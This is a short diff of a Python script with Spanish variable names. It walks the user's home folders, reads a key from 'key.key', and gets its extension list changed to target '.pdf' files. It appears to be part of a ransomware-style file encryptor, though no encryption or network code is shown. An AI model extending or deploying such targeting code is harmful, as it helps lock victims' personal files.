@@ -6,7 +6,7 @@ home = os.environ.get('USERPROFILE') or os.environ.get('HOME')
 carpetas = os.listdir(home)
 carpetas = [x for x in carpetas if not x.startswith('.')]
 
-extensiones = []
+extensiones = ['.pdf']
 
 def returnKey():
     return open('key.key', 'rb').read()
